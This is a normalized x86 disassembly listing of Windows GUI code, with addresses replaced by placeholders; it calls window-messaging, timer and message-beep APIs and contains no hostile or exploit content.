call sub_47ae00
add esp 0xc
jmp r-xdata
neg edi
jne r-xdata
xor eax eax
mov [ rw-data ] 0x3f800000
mov eax [ rw-data ]
test eax eax
je r-xdata
push ebp
push ecx
call sub_472de0
add esp 0x8
jmp r-xdata
mov eax ecx
push 0x1
push eax
call sub_472de0
add esp 0x8
jmp r-xdata
dec eax
push 0x1
push eax
call sub_472de0
add esp 0x8
jmp r-xdata
push 0xa6
push 0xa6
call sub_458630
add esp 0x8
jmp r-xdata
push rw-data
call sub_401dd0
mov [ esp + 0xd4 ] ebx
push rw-data
call sub_401dd0
mov [ esp + 0xd4 ] 0x10
jmp r-xdata
push eax
call sub_457f40
add esp 0x4
cmp eax ebx
jne r-xdata
mov eax rw-data
lea ecx [ esp + 0x130 ]
push ecx
mov ecx rw-data
call sub_4209f0
mov esi [ eax ]
mov edi [ rw-data ]
cmp esi edi
je r-xdata
test ebp ebp
je r-xdata
mov ecx [ rw-data ]
dec ecx
cmp ebp ecx
je r-xdata
push ecx
call sub_457f90
add esp 0x4
dec eax
push eax
push edi
lea ecx [ esp + 0x30 ]
call sub_401e80
nop
mov edx [ rw-data ]
lea ecx [ esp + 0x60 ]
push ecx
push 0x0
push 0x1006
push edx
mov [ esp + 0x84 ] eax
call [ SendMessageA@IAT ]
cmp [ esi + 0x34 ] 0x10
jb r-xdata
mov ecx rw-data
call sub_4010f0
cmp edi eax
jge r-xdata
push 0x0
lea ecx [ esp + 0x73c ]
push ecx
push 0x0
push 0x0
push eax
push ebp
call sub_423c30
add esp 0x18
push sub_4480e0
push 0x20
push 0x1c
lea edx [ esp + 0x744 ]
push edx
mov [ esp + 0xad4 ] 0xffffffff
call sub_4b6814
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x60 ]
push edx
mov [ esp + 0x78 ] eax
mov eax [ rw-data ]
push eax
push 0x102e
push ecx
call [ SendMessageA@IAT ]
mov edx [ rw-data ]
xor esi esi
lea ecx [ ecx ]
push 0xffffffff
push ebp
lea eax [ esp + 0x68 ]
push eax
mov ecx rw-data
call sub_401dd0
xor eax eax
mov ecx eax
call sub_420e20
jmp r-xdata
mov esi ebx
mov ecx [ rw-data ]
sub ecx edx
sar ecx 0x2
test ecx ecx
jbe r-xdata
mov edx [ rw-data ]
test edx edx
je r-xdata
push ebp
push 0x0
push 0xffffffff
push esi
call sub_485220
add esp 0x10
jmp r-xdata
xor ecx ecx
test eax eax
setne cl
inc ecx
mov [ rw-data ] ecx
test edx edx
mov eax [ rw-data ]
je r-xdata
add esi ebp
cmp esi ebx
jge r-xdata
cmp eax 0x3
je r-xdata
cmp ecx 0x1
jne r-xdata
mov ecx [ esp + 0x6c ]
add edx edi
cmp edx ecx
jge r-xdata
cmp eax 0x2
je r-xdata
mov eax [ rw-data ]
add ecx edi
cmp ecx ebp
jge r-xdata
test edx edx
je r-xdata
cmp eax 0x3
je r-xdata
cmp edx 0x1
jne r-xdata
test ecx ecx
je r-xdata
cmp eax 0x2
je r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
imul eax eax 0x70
push 0xffffffff
push 0x0
add eax edx
push eax
jmp r-xdata
mov edx [ rw-data ]
push ebp
push 0x0
push esi
dec edx
push ebp
mov [ rw-data ] edx
push ebp
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
push ecx
lea ecx [ esp + 0x2f4 ]
push ecx
call [ lstrcpynA@IAT ]
lea edx [ esp + 0x2ec ]
push edx
call sub_464fe0
add esp 0x4
jmp r-xdata
mov ecx rw-data
mov edx 0xb
cmp edx esi
jne r-xdata
mov eax [ esp + 0xad4 ]
push ebp
push 0xffffffff
push eax
push edx
mov [ rw-data ] esi
mov [ rw-data ] esi
call sub_486df0
add esp 0x10
jmp r-xdata
lea ecx [ esp + 0x60 ]
call sub_4480e0
lea ecx [ esp + 0x28 ]
call sub_403ab0
lea ecx [ esp + 0x44 ]
call sub_462cf0
jmp r-xdata
lea ebx [ ebx ]
call sub_401ff0
call sub_46fe50
mov ecx rw-data
call sub_42c3a0
mov esi eax
dec esi
js r-xdata
mov ecx rw-data
inc edi
call sub_42c3a0
cmp edi eax
jl r-xdata
push 0x5
push eax
call esi
mov ecx [ rw-data ]
mov edx [ ecx + edi * 4 ]
push 0xffffffeb
push edx
call ebx
cmp eax ebp
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x12c ]
cmp eax ebp
je r-xdata
mov ecx rw-data
call sub_42c3a0
mov ecx rw-data
mov esi eax
call sub_4010f0
push eax
mov ecx rw-data
call sub_42c9a0
mov ecx rw-data
call sub_42c3a0
cmp esi eax
jge r-xdata
push 0x1
push eax
call [ EnableWindow@IAT ]
movzx eax [ rw-data ]
mov ecx [ rw-data ]
shl eax 0x10
or eax 0x1
push eax
push 0x1
push 0x406
push ecx
call [ PostMessageA@IAT ]
push esi
lea edx [ esp + 0x48 ]
push edx
lea eax [ esp + 0x1d4 ]
push eax
call sub_402140
add esp 0xc
push eax
lea ecx [ esp + 0x144 ]
mov [ esp + 0xac8 ] 0x16
call sub_401ff0
lea ecx [ esp + 0x1cc ]
mov [ esp + 0xac4 ] bl
call sub_4480e0
lea ecx [ esp + 0x4f4 ]
push ecx
lea ecx [ esp + 0x144 ]
call sub_4010a0
push eax
call edi
mov eax [ esp + 0x514 ]
mov edx [ esp + 0x4f4 ]
mov ecx [ esp + 0x510 ]
mov [ esp + 0x160 ] eax
mov eax [ esp + 0x50c ]
mov [ esp + 0x15c ] edx
mov edx [ esp + 0x508 ]
mov [ esp + 0x16c ] eax
or eax 0xffffffff
mov [ esp + 0x164 ] ecx
mov ecx rw-data
mov [ esp + 0x168 ] edx
mov [ esp + 0x170 ] eax
mov [ esp + 0x17c ] eax
mov [ esp + 0x180 ] ebp
call sub_4010f0
lea ecx [ esp + 0x140 ]
push ecx
mov ecx rw-data
mov [ esp + 0x188 ] eax
mov [ esp + 0x17c ] eax
mov [ esp + 0x18c ] eax
mov [ esp + 0x190 ] ebp
mov [ esp + 0x194 ] ebp
call sub_407bb0
mov edx [ esp + 0x154 ]
sub edx [ esp + 0x58 ]
mov al [ esi + edx + 0x1 ]
test al al
lea esi [ esi + edx + 0x1 ]
jne r-xdata
xor eax eax
test edi edi
setge al
lea eax [ eax + eax - 0x1 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x14 ] ebp
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x0
push ecx
mov ecx [ esp + 0xadc ]
push ecx
push 0x0
call sub_486df0
add esp 0x10
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
lea eax [ esp + 0xbc ]
mov eax [ esp + 0xd0 ]
mov esi 0x10
xor bl bl
cmp eax esi
mov eax [ esp + 0xbc ]
jae r-xdata
cmp esi 0x10
mov ecx edi
jae r-xdata
push ebx
call [ MessageBeep@IAT ]
lea ecx [ esp + 0x60 ]
call sub_4480e0
jmp r-xdata
mov eax [ esp + 0xacc ]
cmp eax 0x49
jne r-xdata
cmp ebp [ esi + 0x8 ]
je r-xdata
lea ecx [ esp + 0x28 ]
mov [ esp + 0xac4 ] 0xffffffff
call sub_4480e0
mov al [ esp + 0x13 ]
test al al
jne r-xdata
dec ebp
sub esi 0x70
inc ebp
add esi 0x70
jmp r-xdata
push 0x0
push esi
push 0x0
lea eax [ esi + 0x20 ]
push 0x0
push eax
push ebp
call sub_423c30
jmp r-xdata
mov eax [ esi + 0x20 ]
push 0x0
push esi
push 0x0
push 0x0
push eax
push ebp
call sub_423c30
jmp r-xdata
mov ecx [ rw-data ]
mov eax edi
imul eax eax 0x70
mov edx [ eax + ecx + 0x30 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ rw-data ]
push ecx
mov ecx eax
call sub_465300
test eax eax
mov [ esp + 0xac4 ] 0xb
mov [ esp + 0x14 ] eax
je r-xdata
xor edi edi
mov ecx [ rw-data ]
test ecx ecx
mov edx [ rw-data ]
jne r-xdata
xor eax eax
lea ebx [ ebx ]
add esi ebp
cmp esi ebx
jge r-xdata
cmp eax 0x3
je r-xdata
mov [ rw-data ] 0x1
cmp ecx 0x1
cmp eax 0x3
je r-xdata
cmp eax 0x1
je r-xdata
test edx edx
je r-xdata
mov ecx [ rw-data ]
mov eax 0x1
mov [ rw-data ] eax
cmp ecx eax
jmp r-xdata
cmp eax 0x3
je r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ esp + eax * 4 + 0x44 ]
push edx
push ecx
push 0x0
call sub_47ae00
add esp 0xc
jmp r-xdata
test edx edx
je r-xdata
cmp eax 0x3
je r-xdata
cmp esi 0x1
mov [ rw-data ] 0x1
je r-xdata
cmp eax 0x3
je r-xdata
cmp eax 0x1
je r-xdata
add ecx edi
cmp ecx ebp
jge r-xdata
cmp esi 0x1
mov [ rw-data ] 0x1
je r-xdata
cmp eax 0x3
je r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov eax [ esp + edx * 4 + 0x44 ]
push ecx
neg eax
push eax
push 0x0
call sub_47ae00
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_401dd0
push ebp
push 0x0
push esi
push 0xffffffff
push 0xffffffff
jmp r-xdata
mov ecx [ esp + 0x2c ]
mov eax esi
imul eax eax 0x1c
add ecx eax
mov eax [ ecx + 0x14 ]
test eax eax
je r-xdata
mov eax [ esp + 0x74 ]
test eax eax
je r-xdata
mov eax [ eax + 0x12c ]
cmp eax ebp
je r-xdata
push ebp
push eax
call esi
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0xad4 ]
push 0x1
push ebp
push eax
push ecx
call sub_485220
add esp 0x10
lea ecx [ esp + 0x140 ]
call sub_401a90
lea ecx [ esp + 0x44 ]
call sub_4480e0
mov esi [ esp + 0x14 ]
jmp r-xdata
mov eax [ rw-data ]
test eax eax
mov bl [ esp + 0x18 ]
mov [ esp + 0x13 ] bl
je r-xdata
cmp edi 0xc
jge r-xdata
xor edi edi
mov [ esp + 0x48 ] edi
mov [ esp + 0x4c ] edi
mov [ esp + 0x50 ] edi
cmp [ rw-data ] edi
mov [ esp + 0xac4 ] 0x3
jne r-xdata
mov bl 0x1
dec eax
push eax
push ecx
lea ecx [ esp + 0x68 ]
call sub_401e80
jmp r-xdata
mov ecx rw-data
cmp eax 0x4a
jne r-xdata
mov esi [ esi ]
cmp esi edi
jne r-xdata
mov esi [ esi ]
cmp esi edi
jne r-xdata
mov edx [ esp + 0xad4 ]
push 0x1
push 0x0
push ebp
push edx
call sub_485220
add esp 0x10
jmp r-xdata
lea ecx [ eax + esi + 0x4 ]
mov ecx [ eax + esi + 0x4 ]
jmp r-xdata
mov [ esp + 0x78 ] 0xf
mov [ esp + 0x74 ] 0x0
mov [ esp + 0x64 ] 0x0
mov eax [ rw-data ]
cmp [ eax + esi + 0x18 ] ebx
mov [ esp + 0xac4 ] 0x9
jb r-xdata
add esp 0x18
inc edi
push edi
lea ecx [ esi + 0x38 ]
call sub_421150
mov esi [ rw-data ]
mov ebx [ GetWindowLongA@IAT ]
xor edi edi
mov ecx [ edx + esi * 4 ]
cmp ecx ebp
je r-xdata
cmp esi eax
jge r-xdata
jbe r-xdata
cmp [ esp + 0xacc ] 0x7b
je r-xdata
mov eax edx
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
test esi esi
mov ebp [ rw-data ]
mov [ rw-data ] esi
jl r-xdata
mov edi [ edx + eax * 4 ]
dec edi
cmp ebx edi
jne r-xdata
cmp eax 0x3
je r-xdata
cmp eax 0x1
je r-xdata
mov edx [ rw-data ]
push edx
cmp eax 0x2
je r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov eax [ esp + edx * 4 + 0x1c ]
push ecx
push 0x0
push eax
call sub_47ae00
add esp 0xc
jmp r-xdata
mov ecx [ rw-data ]
mov eax 0x1
cmp ecx eax
mov [ rw-data ] eax
je r-xdata
cmp eax 0x3
je r-xdata
je r-xdata
cmp eax 0x1
je r-xdata
cmp esi 0x1
mov [ rw-data ] 0x1
je r-xdata
cmp eax 0x3
je r-xdata
cmp eax 0x1
je r-xdata
mov eax [ rw-data ]
cmp eax 0x8
mov esi [ rw-data ]
mov edi [ LockWindowUpdate@IAT ]
mov [ rw-data ] 0x2
jl r-xdata
cmp eax 0x2
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ esp + ecx * 4 + 0x1c ]
push eax
neg edx
push 0x0
push edx
call sub_47ae00
add esp 0xc
jmp r-xdata
cmp esi 0x1
mov [ rw-data ] 0x1
je r-xdata
cmp eax 0x3
je r-xdata
mov eax [ rw-data ]
cmp eax 0x8
mov esi [ rw-data ]
mov edi [ LockWindowUpdate@IAT ]
mov [ rw-data ] 0x2
jl r-xdata
cmp eax 0x1
je r-xdata
call sub_4719b0
add esp 0x14
dec esi
jns r-xdata
push 0x1
push 0xffffffff
call sub_4010a0
push eax
call sub_425d10
add esp 0xc
cmp ebp 0xffffffff
lea ecx [ esp + 0x60 ]
je r-xdata
push 0x5
push eax
call esi
mov edx [ rw-data ]
mov [ edx + esi * 4 ] ebp
mov ecx rw-data
inc esi
call sub_42c3a0
cmp esi eax
jl r-xdata
mov ebp [ rw-data ]
cmp ebp 0x2
mov eax [ rw-data ]
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov esi [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov esi [ rw-data ]
push eax
push ebp
push 0x84
mov [ rw-data ] ecx
mov [ rw-data ] 0x0
call sub_48a5f0
add esp 0xc
mov [ rw-data ] esi
mov [ rw-data ] edi
jmp r-xdata
cmp [ esp + 0x78 ] esi
mov eax [ esp + 0x64 ]
jae r-xdata
test bl bl
jne r-xdata
mov [ esp + 0xd0 ] ebp
mov [ esp + 0xcc ] ebx
mov [ esp + 0xbc ] 0x0
mov [ esp + 0x124 ] ebp
mov [ esp + 0x120 ] ebx
mov [ esp + 0x110 ] 0x0
cmp [ rw-data ] ebx
push 0xffffffff
mov [ esp + 0xac8 ] 0x2
lea ecx [ esp + 0xbc ]
push ebx
jne r-xdata
lea eax [ esp + 0x128 ]
push eax
mov ecx rw-data
call sub_4209f0
cmp esi [ eax ]
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
lea edi [ eax + esi + 0x4 ]
mov edi [ eax + esi + 0x4 ]
jmp r-xdata
cmp [ eax + esi + 0x18 ] ebx
jb r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
inc esi
jmp r-xdata
call sub_439ed0
mov edx [ rw-data ]
push 0x6d
push 0x6e
call sub_458630
push 0x6f
push 0x70
call sub_458630
mov eax [ esp + 0xadc ]
add esp 0x10
cmp eax 0x7b
jne r-xdata
mov ecx [ rw-data ]
push eax
push ecx
call [ KillTimer@IAT ]
mov [ rw-data ] esi
cmp [ rw-data ] esi
jne r-xdata
cmp [ esp + 0xacc ] 0x6f
mov edi [ ecx + esi * 4 ]
jne r-xdata
cmp esi eax
jge r-xdata
inc eax
jmp r-xdata
mov esi eax
cmp eax 0x2
je r-xdata
mov eax [ rw-data ]
push eax
push 0x0
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push eax
jmp r-xdata
cmp eax ecx
je r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x8
mov esi [ rw-data ]
mov edi [ LockWindowUpdate@IAT ]
mov [ rw-data ] 0x2
jl r-xdata
cmp eax 0x2
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ esp + ecx * 4 + 0x1c ]
push eax
push 0x0
push edx
call sub_47ae00
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
push eax
call edi
test al 0x2
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x8
mov esi [ rw-data ]
mov edi [ rw-data ]
mov ebp [ LockWindowUpdate@IAT ]
mov [ rw-data ] 0x2
jl r-xdata
cmp eax edx
je r-xdata
mov ecx [ rw-data ]
push ecx
call edi
test al 0x2
je r-xdata
cmp eax 0x2
jne r-xdata
test esi esi
mov eax [ edi + esi * 4 ]
mov ecx [ eax + 0x140 ]
mov [ rw-data ] ecx
jne r-xdata
mov edx [ rw-data ]
mov eax [ edx + esi * 4 ]
push 0x0
push 0x0
push eax
call [ InvalidateRect@IAT ]
mov edx [ esp + 0xad4 ]
push 0x1
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x1
push 0x0
push ebx
push edx
call sub_4010a0
push eax
call sub_4863a0
add esp 0x2c
jmp r-xdata
push esi
push ebx
push esi
call sub_4010a0
push eax
push ebp
call sub_423380
add esp 0x14
jmp r-xdata
test edx edx
mov ecx [ rw-data ]
jne r-xdata
cmp ecx 0x1
jne r-xdata
test bl bl
je r-xdata
mov edx [ rw-data ]
push edx
lea ecx [ esp + 0x48 ]
push ecx
push eax
lea ecx [ esp + 0x1f4 ]
call sub_403030
lea edx [ esp + 0x1e8 ]
mov esi 0x2
push edx
mov [ esp + 0xac8 ] 0x4
mov [ esp + 0x210 ] esi
call sub_4090d0
add esp 0x4
test eax eax
jge r-xdata
lea eax [ esp + 0x64 ]
cmp [ esp + 0x78 ] esi
mov eax [ esp + 0x64 ]
jae r-xdata
cmp [ rw-data ] ebx
je r-xdata
mov esi [ esi + 0x4 ]
jmp r-xdata
mov esi [ esi + 0x8 ]
mov eax [ esi + 0x34 ]
add esi 0x1c
cmp eax 0x10
jb r-xdata
lea edx [ esp + 0x13c ]
push edx
mov ecx rw-data
call sub_4209f0
mov esi [ eax ]
jmp r-xdata
lea ecx [ esp + 0x60 ]
call sub_4480e0
jmp r-xdata
mov al [ esp + 0x13 ]
test al al
jne r-xdata
push ecx
call sub_457f90
add esp 0x4
dec eax
push eax
push edi
lea ecx [ esp + 0x68 ]
call sub_401e80
lea edx [ esp + 0x60 ]
push edx
lea eax [ esp + 0x2c ]
push eax
call sub_420d20
add esp 0x8
test al al
je r-xdata
call sub_416b80
cmp [ rw-data ] ebp
je r-xdata
mov ecx [ ecx + edi * 4 ]
push 0xffffffeb
push ecx
call ebx
mov esi eax
mov ecx [ esi + 0x20 ]
cmp ecx ebp
je r-xdata
cmp edi eax
jge r-xdata
cmp edx ebp
jne r-xdata
sub [ rw-data ] 0x2
call [ timeGetTime@IAT ]
mov edx [ rw-data ]
mov ecx eax
sub ecx edx
mov edx [ rw-data ]
mov [ rw-data ] ecx
sub eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ rw-data ]
or eax 0x80000000
mov [ rw-data ] edx
mov [ rw-data ] eax
cmp ebx 0xffffffff
mov [ rw-data ] esi
jne r-xdata
call [ timeGetTime@IAT ]
mov ebx [ rw-data ]
mov ecx [ rw-data ]
mov esi eax
sub esi ebx
mov ebx [ rw-data ]
mov edx eax
sub edx ecx
cmp ebp ebx
mov [ rw-data ] edx
mov [ rw-data ] esi
je r-xdata
cmp ebx esi
jl r-xdata
mov eax [ rw-data ]
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ edx - 0x4 ]
sub eax edi
mov edi eax
jmp r-xdata
cmp eax ecx
jge r-xdata
cmp eax 0x1
mov eax [ esp + 0x6c ]
jne r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
push ecx
mov ecx [ esp + eax * 4 + 0x48 ]
push ecx
neg edx
push edx
call sub_47ae00
add esp 0xc
jmp r-xdata
xor edx edx
push 0x1
push 0x0
call sub_48a5f0
add esp 0xc
mov [ rw-data ] 0x2
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ esp + eax * 4 + 0x1c ]
push edx
neg esi
push esi
push ecx
call sub_47ae00
add esp 0xc
jmp r-xdata
xor esi esi
mov ecx [ rw-data ]
push ecx
call edi
test al 0x2
je r-xdata
cmp eax 0x1
jne r-xdata
push 0x0
call edi
test al 0x2
je r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x1
call sub_48a5f0
mov eax [ rw-data ]
add esp 0xc
cmp eax 0x8
jl r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx [ esp + ecx * 4 + 0x44 ]
push eax
neg edx
push edx
push ebx
call sub_47ae00
add esp 0xc
jmp r-xdata
xor ebx ebx
mov ecx [ rw-data ]
push ecx
call ebp
test al 0x2
je r-xdata
cmp eax 0x2
jne r-xdata
push 0x0
call edi
test al 0x2
je r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x1
call sub_48a5f0
mov eax [ rw-data ]
add esp 0xc
cmp eax 0x8
jl r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov eax [ esp + edx * 4 + 0x1c ]
push ecx
neg eax
push ebx
push eax
call sub_47ae00
add esp 0xc
jmp r-xdata
xor ebx ebx
mov ecx [ edi + esi * 4 ]
push rw-data
add ecx 0x20
call sub_40b320
mov ecx [ edi + esi * 4 ]
push rw-data
add ecx 0x24
call sub_40b320
test esi esi
je r-xdata
cmp ebp 0x2
je r-xdata
cmp [ esp + 0xacc ] 0x3
jne r-xdata
lea ebx [ eax - 0x1 ]
cmp ecx ebx
jne r-xdata
test edx edx
jne r-xdata
mov ecx [ rw-data ]
push ecx
call sub_4a8dd0
add esp 0x4
test al al
je r-xdata
test bl bl
je r-xdata
push edi
call [ MessageBeep@IAT ]
lea ecx [ esp + 0x1e8 ]
call sub_401a00
jmp r-xdata
lea ecx [ esp + 0x44 ]
push ecx
push eax
call sub_42ee90
add esp 0x8
test eax eax
jne r-xdata
lea eax [ esp + 0x64 ]
mov esi [ edi + 0x4 ]
push 0xffffffff
add esi 0x4
push esi
push ebx
call sub_423680
add esp 0xc
jmp r-xdata
mov esi [ esi + 0x4 ]
push 0xffffffff
push esi
push ebx
call sub_423680
add esp 0xc
jmp r-xdata
cmp [ esp + 0xacc ] 0x4b
jne r-xdata
inc ebp
cmp [ esp + 0xacc ] 0x4b
mov [ esp + 0x13 ] 0x1
je r-xdata
call sub_43d170
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
mov esi [ esi + 0x24 ]
cmp esi ebp
je r-xdata
call sub_439ed0
mov eax [ esp + 0xad4 ]
push eax
call sub_466150
add esp 0x4
jmp r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx [ rw-data ]
or ecx 0x80000000
cmp eax esi
mov [ rw-data ] edx
mov [ rw-data ] ecx
jle r-xdata
xor ebx ebx
mov ecx [ rw-data ]
cmp ecx 0x1
jne r-xdata
mov edx eax
sub edx edi
lea esi [ edi + edx ]
mov [ rw-data ] edx
mov [ rw-data ] esi
call [ timeGetTime@IAT ]
sub eax edi
add edi eax
mov [ rw-data ] eax
mov [ rw-data ] edi
jmp r-xdata
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ rw-data ]
push ecx
mov ecx [ rw-data ]
mov ecx [ esp + ecx * 4 + 0x48 ]
push ecx
sub eax edx
push eax
call sub_47ae00
add esp 0xc
jmp r-xdata
mov edx eax
mov eax [ rw-data ]
push eax
neg esi
push esi
jmp r-xdata
xor esi esi
push 0x0
call edi
test al 0x2
je r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x1
call sub_48a5f0
mov eax [ rw-data ]
add esp 0xc
cmp eax 0x8
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
push eax
mov eax [ esp + ecx * 4 + 0x48 ]
neg eax
push eax
neg edx
push edx
call sub_47ae00
add esp 0xc
jmp r-xdata
xor edx edx
lea edx [ esp + 0x60 ]
push edx
lea eax [ esp + 0x2c ]
push eax
call sub_45e3f0
mov eax [ rw-data ]
mov esi [ rw-data ]
mov edi [ rw-data ]
add esp 0x8
test eax eax
je r-xdata
cmp [ rw-data ] esi
je r-xdata
push 0x0
call ebp
test al 0x2
je r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x1
call sub_48a5f0
mov eax [ rw-data ]
add esp 0xc
cmp eax 0x8
jl r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov eax [ esp + edx * 4 + 0x1c ]
push ecx
push ebx
push eax
call sub_47ae00
add esp 0xc
jmp r-xdata
xor ebx ebx
lea eax [ esp + 0x60 ]
push eax
lea ecx [ esp + 0x2c ]
push ecx
call sub_45e3f0
mov eax [ rw-data ]
mov esi [ rw-data ]
mov edi [ rw-data ]
add esp 0x8
test eax eax
je r-xdata
cmp [ rw-data ] esi
je r-xdata
lea esi [ eax - 0x1 ]
cmp edx esi
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
cmp ecx 0x1
jne r-xdata
mov cl [ esp + 0x18 ]
test cl cl
je r-xdata
test bl bl
je r-xdata
test edi edi
mov eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
lea eax [ esp + 0xb8 ]
push eax
lea ecx [ esp + 0x48 ]
call sub_407bb0
lea ecx [ esp + 0x44 ]
call sub_403b20
lea ecx [ esp + 0xb8 ]
call sub_401a90
lea ecx [ esp + 0x60 ]
call sub_4480e0
jmp r-xdata
xor ebx ebx
xor ebp ebp
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebp
mov [ esp + 0x34 ] ebx
mov esi [ esp + 0x48 ]
mov eax [ esp + 0x4c ]
cmp esi eax
mov [ esp + 0xac4 ] 0x7
je r-xdata
push edi
call [ MessageBeep@IAT ]
jmp r-xdata
lea ecx [ esp + 0x60 ]
call sub_4480e0
push 0xffffffff
push 0x0
lea ecx [ esp + 0x68 ]
push ecx
lea ecx [ esp + 0x34 ]
call sub_401dd0
mov ecx rw-data
mov [ esp + 0x78 ] 0xf
mov [ esp + 0x74 ] ebp
mov [ esp + 0x64 ] 0x0
mov [ esp + 0xac4 ] 0xb
call sub_401420
cmp [ rw-data ] 0x1
jne r-xdata
mov edx [ esp + 0x64 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
push eax
call sub_441600
add esp 0x4
test eax eax
jne r-xdata
inc edi
jmp r-xdata
mov ecx esi
call sub_439ed0
mov eax [ rw-data ]
push 0x1
push esi
push ebx
push eax
call sub_485220
add esp 0x10
jmp r-xdata
cmp ecx 0x2
jne r-xdata
cmp [ esp + 0x14 ] 0x5
je r-xdata
mov esi [ esp + 0x14 ]
mov eax [ rw-data ]
push sub_4877a0
push 0x1
push esi
push eax
call [ SetTimer@IAT ]
push 0x6e
push 0x6d
mov [ rw-data ] eax
call sub_458630
push 0x70
push 0x6f
call sub_458630
add esp 0x10
dec esi
mov [ rw-data ] esi
jmp r-xdata
mov ecx [ rw-data ]
push 0x1
push esi
push ebx
push ecx
call sub_485220
add esp 0x10
cmp [ rw-data ] esi
je r-xdata
mov ecx [ rw-data ]
mov edx [ esp + ecx * 4 + 0x24 ]
neg edx
push edx
call sub_47ae00
add esp 0xc
jmp r-xdata
lea eax [ esp + 0x60 ]
push eax
lea ecx [ esp + 0x2c ]
push ecx
call sub_45e3f0
mov eax [ rw-data ]
mov esi [ rw-data ]
mov edi [ rw-data ]
add esp 0x8
test eax eax
je r-xdata
cmp [ rw-data ] esi
mov ecx [ esp + 0x34 ]
mov [ rw-data ] ecx
cmp eax 0x2
jne r-xdata
cmp [ rw-data ] edi
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
mov edx [ esp + 0x34 ]
mov [ rw-data ] edx
cmp eax 0x2
jne r-xdata
mov cl [ esp + 0x13 ]
test cl cl
je r-xdata
cmp [ esp + 0xacc ] 0x2
jne r-xdata
cmp ebp 0x2
jne r-xdata
cmp edi 0x1
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
jle r-xdata
cmp eax ebp
jne r-xdata
dec eax
cmp eax 0x4
ja r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov esi [ esp + 0x2c ]
cmp esi ebp
mov ebx [ MessageBeep@IAT ]
je r-xdata
add esi 0x1c
mov edi edi
cmp [ rw-data ] ebp
mov ebx [ SendMessageA@IAT ]
je r-xdata
push ebp
push ebp
push ebp
push ebp
push rw-data
call sub_439280
add esp 0x4
push eax
push rw-data
push ebp
mov ecx rw-data
call sub_4411b0
cmp [ esp + 0x78 ] 0x10
jb r-xdata
mov [ rw-data ] ebp
jmp r-xdata
mov ecx [ rw-data ]
cmp ecx ebp
jne r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
cmp [ esp + 0x14 ] 0x4
jne r-xdata
mov edi [ rw-data ]
mov ecx eax
sub ecx edx
test edi edi
je r-xdata
jmp r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov edx [ esp + 0x6c ]
mov [ rw-data ] edx
cmp eax 0x1
jne r-xdata
test eax eax
je r-xdata
je r-xdata
mov eax [ esp + 0x6c ]
mov [ rw-data ] eax
cmp eax 0x1
jne r-xdata
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
cmp ecx 0x1
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov cl [ rw-data ]
test cl cl
jne r-xdata
mov [ esp + 0x13 ] 0x0
test esi esi
je r-xdata
test eax eax
jne r-xdata
test edi edi
mov [ esp + 0x13 ] 0x0
mov eax 0xc
jmp [ eax * 4 + jump_table_48ed10 ]
test [ rw-data ] 0x2
jne r-xdata
mov edx [ rw-data ]
or edx 0x1
push sub_4c30d0
